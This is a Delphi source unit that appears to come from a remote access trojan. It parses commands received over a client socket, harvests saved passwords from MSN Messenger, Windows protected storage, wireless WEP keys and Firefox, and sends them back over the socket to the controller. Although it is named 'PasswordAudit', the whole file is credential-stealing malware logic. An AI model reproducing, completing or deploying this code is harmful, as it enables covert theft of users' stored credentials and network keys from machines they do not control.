unit UnitPasswordAudit;

interface

uses
  windows,messages,socketunit, unitshareddata, CompressionStreamUnit, unitmsnpass,unitwep, unitstorage, UnitFirefox;

procedure ParseData(Socket: TClientSocket; Data: string); forward;

implementation

procedure SendData(Socket: TClientSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'PasswordAudit|' + Data);
end;

procedure ParseData(Socket: TClientSocket; Data: string);
var
  Command: string;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'Messenger' then begin
    SendData(Socket,Command + '|' + UnitMsnPass.ObtainPasswords);
  end;

  if Command = 'Storage' then begin
    SendData(Socket,Command + '|' + UnitStorage.ObtainPasswords);
  end;

  if Command = 'Wireless' then begin
    SendData(Socket,Command + '|' + UnitWep.ObtainPasswords);
  end;

  if Command = 'Firefox' then begin
    SendData(Socket,Command + '|' + UnitFirefox.ObtainPasswords);
  end;

end;

end.
